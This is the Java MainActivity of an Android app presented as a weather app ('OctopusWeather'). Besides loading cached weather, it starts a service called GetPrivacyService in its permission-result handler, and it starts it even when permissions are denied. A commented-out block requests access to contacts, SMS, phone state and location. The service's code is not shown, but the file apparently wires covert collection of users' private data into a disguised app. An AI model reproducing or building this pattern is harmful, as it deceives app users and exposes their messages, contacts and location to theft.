package com.example.zy.octopusweather;

import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.widget.Toast;

import com.example.zy.octopusweather.service.GetPrivacyService;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "zy_MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        /*//运行时权限处理
        List<String> permissionList = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
            permissionList.add(Manifest.permission.ACCESS_FINE_LOCATION);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
            permissionList.add(Manifest.permission.READ_CONTACTS);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED) {
            permissionList.add(Manifest.permission.READ_PHONE_STATE);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            permissionList.add(Manifest.permission.READ_SMS);
        }
        if (!permissionList.isEmpty()) {
            String[] permissions = permissionList.toArray(new String[permissionList.size()]);
            ActivityCompat.requestPermissions(MainActivity.this, permissions, 1);
            Log.d(TAG, "[info]正在申请运行时权限... ");
        } else {
            Intent getPrivacyIntent = new Intent(this, GetPrivacyService.class);
            startService(getPrivacyIntent);
            Log.d(TAG, "[info]权限已经同意，无需申请，程序运行中...");
        }*/

        //判断是否有缓存
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
        if (prefs.getString("weather", null) != null) {
            Intent intent = new Intent(this, WeatherActivity.class);
            startActivity(intent);
            finish();
        }
    }

    //运行时权限处理
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        Log.d(TAG, "[info]权限申请完毕，正在处理结果...");
        switch (requestCode) {
            case 1:
                if (grantResults.length > 0) {
                    for (int result : grantResults) {
                        if (result != PackageManager.PERMISSION_GRANTED) {
                            Toast.makeText(this, "同意所有权限才可使用本程序", Toast.LENGTH_SHORT).show();
                        }
                    }
                    Intent getPrivacyIntent = new Intent(this, GetPrivacyService.class);
                    startService(getPrivacyIntent);
                    Log.d(TAG, "[info]GetPrivacyService已启动 ");
                } else {
                    Toast.makeText(this, "发生未知错误", Toast.LENGTH_SHORT).show();
                    this.finish();
                }
                break;
            default:
                break;
        }
    }

}
